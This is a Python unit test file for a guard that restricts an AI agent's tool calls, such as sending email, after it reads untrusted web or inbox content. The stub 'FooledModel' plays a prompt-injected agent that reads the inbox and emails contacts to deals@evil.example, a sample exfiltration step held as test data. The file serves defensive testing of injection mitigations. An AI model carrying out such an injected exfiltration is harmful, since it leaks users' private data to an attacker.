import unittest

from lab import Guard, wrap_untrusted


class FooledModel:
    """A model that obeys the injected instruction: the worst case."""

    def next_actions(self):
        return [("read_inbox", {}), ("send_email", {"to": "deals@evil.example", "body": "contacts"})]


class GuardTest(unittest.TestCase):
    def test_summarise_task_cannot_send_email_at_all(self):
        guard = Guard(task="summarise")
        guard.saw_untrusted("https://reviews.example")
        results = [guard.check(t, a) for t, a in FooledModel().next_actions()]
        self.assertFalse(any(r.allowed for r in results))
        self.assertIn("not granted", results[1].reason)

    def test_email_task_blocks_unknown_recipient(self):
        guard = Guard(task="email_digest", allowed_recipients={"me@company.example"})
        d = guard.check("send_email", {"to": "deals@evil.example"})
        self.assertFalse(d.allowed)
        self.assertIn("allow-list", d.reason)

    def test_outbound_after_untrusted_content_needs_approval(self):
        guard = Guard(task="email_digest", allowed_recipients={"me@company.example"})
        self.assertTrue(guard.check("send_email", {"to": "me@company.example"}).allowed)
        guard.saw_untrusted("inbox:message-42")
        d = guard.check("send_email", {"to": "me@company.example"})
        self.assertFalse(d.allowed)
        self.assertIn("approval", d.reason)

    def test_human_approval_unblocks(self):
        guard = Guard(task="email_digest", allowed_recipients={"me@company.example"}, approve=lambda tool, args: True)
        guard.saw_untrusted("inbox:message-42")
        self.assertTrue(guard.check("send_email", {"to": "me@company.example"}).allowed)

    def test_everything_is_logged(self):
        guard = Guard(task="summarise")
        guard.saw_untrusted("https://reviews.example")
        guard.check("send_email", {"to": "x@y.example"})
        self.assertEqual([e["event"] for e in guard.log], ["untrusted_content", "tool_request"])
        self.assertFalse(guard.log[1]["allowed"])

    def test_wrapping_marks_source(self):
        wrapped = wrap_untrusted("hello", "https://a.example")
        self.assertTrue(wrapped.startswith('<untrusted_content source="https://a.example">'))
        self.assertTrue(wrapped.endswith("</untrusted_content>"))


if __name__ == "__main__":
    unittest.main()
